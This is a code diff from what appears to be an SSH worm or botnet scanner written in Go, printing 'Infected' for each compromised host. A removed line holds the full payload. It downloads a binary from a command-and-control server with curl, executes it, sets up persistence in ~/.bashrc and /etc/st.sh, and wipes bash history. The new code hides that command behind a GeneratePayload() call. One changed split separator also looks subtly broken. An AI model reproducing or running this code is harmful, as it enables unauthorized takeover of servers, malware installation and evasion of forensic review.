@@ -3,7 +3,6 @@ package server
 import (
 	"bytes"
 	"fmt"
-	"homo/network/config"
 	"os"
 	"strings"
 	"sync"
@@ -37,7 +36,7 @@ func Scan() {
 		fmt.Println("Read servers: " + err.Error())
 	}
 
-	for _, i := range strings.Split(string(data), "\n") {
+	for _, i := range strings.Split(string(data), "\n 	") {
 		serv := strings.Split(string(i), ":")
 
 		if len(serv) < 2 {
@@ -89,18 +88,11 @@ func (sess *Sshsess) Inject(w *sync.WaitGroup) {
 	var setSession bytes.Buffer
 	sshSesh.Stdout = &setSession
 
-	var host string
-	if !config.GetConfig().Api.CustomPathEnabled {
-		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + "/SXkmarwet7vghj"
-	} else {
-		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
-	}
-
 	fmt.Println("[HOMO SCANNER] Infected: " + sess.Ip + ":22")
 
 	go func() {
-		sshSesh.Run("apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://" + host + " -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history")
-
+		payload := GeneratePayload()
+		sshSesh.Run(payload)
 		sshSesh.Close()
 
 	}()
